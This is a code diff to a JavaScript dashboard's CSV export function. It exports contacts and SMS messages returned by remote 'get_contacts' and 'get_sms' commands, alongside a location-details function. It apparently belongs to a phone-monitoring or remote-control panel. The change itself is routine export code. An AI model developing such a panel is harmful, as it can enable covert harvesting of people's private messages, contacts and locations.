@@ -1815,36 +1815,47 @@ window.downloadCSV = function() {
   
   let csv = '';
   
-  if (cmdType === 'get_contacts') {
-    csv = 'Name,Phone,Email\n';
-    (data.contacts || []).forEach(c => {
-      const name = (c.displayName || '').replace(/,/g, ' ').replace(/"/g, '""');
-      const phones = (c.phones || []).join('; ').replace(/,/g, ' ').replace(/"/g, '""');
-      const emails = (c.emails || []).join('; ').replace(/,/g, ' ').replace(/"/g, '""');
-      csv += `"${name}","${phones}","${emails}"\n`;
-    });
-  } else if (cmdType === 'get_sms') {
-    csv = 'Date,From/To,Type,Message\n';
-    (data.messages || []).forEach(m => {
-      const date = new Date(m.date).toISOString();
-      const address = (m.address || '').replace(/,/g, ' ').replace(/"/g, '""');
-      const type = m.type || 'unknown';
-      const body = (m.body || '').replace(/,/g, ' ').replace(/\n/g, ' ').replace(/"/g, '""');
-      csv += `"${date}","${address}","${type}","${body}"\n`;
-    });
+  try {
+    if (cmdType === 'get_contacts') {
+      csv = '\uFEFFName,Phone,Email\n'; // Add BOM for Excel UTF-8
+      (data.contacts || []).forEach(c => {
+        const name = (c.displayName || '').replace(/"/g, '""');
+        const phones = (c.phones || []).join('; ').replace(/"/g, '""');
+        const emails = (c.emails || []).join('; ').replace(/"/g, '""');
+        csv += `"${name}","${phones}","${emails}"\n`;
+      });
+    } else if (cmdType === 'get_sms') {
+      csv = '\uFEFFDate,From/To,Type,Message\n'; // Add BOM for Excel UTF-8
+      (data.messages || []).forEach(m => {
+        const date = new Date(m.date).toISOString();
+        const address = (m.address || '').replace(/"/g, '""');
+        const type = m.type || 'unknown';
+        const body = (m.body || '').replace(/\n/g, ' ').replace(/"/g, '""');
+        csv += `"${date}","${address}","${type}","${body}"\n`;
+      });
+    }
+    
+    // Create blob and download
+    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.setAttribute('href', url);
+    link.setAttribute('download', filename);
+    link.style.display = 'none';
+    document.body.appendChild(link);
+    link.click();
+    
+    // Cleanup
+    setTimeout(() => {
+      document.body.removeChild(link);
+      URL.revokeObjectURL(url);
+    }, 100);
+    
+    toast(`✅ បាន download ${filename}!`, true);
+  } catch (error) {
+    console.error('Download error:', error);
+    toast(`❌ Download failed: ${error.message}`, true);
   }
-  
-  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
-  const link = document.createElement('a');
-  const url = URL.createObjectURL(blob);
-  link.setAttribute('href', url);
-  link.setAttribute('download', filename);
-  link.style.visibility = 'hidden';
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
-  
-  toast('✅ Downloaded!', true);
 };
 
 window.showLocationDetails = async function(cmdId, userId) {
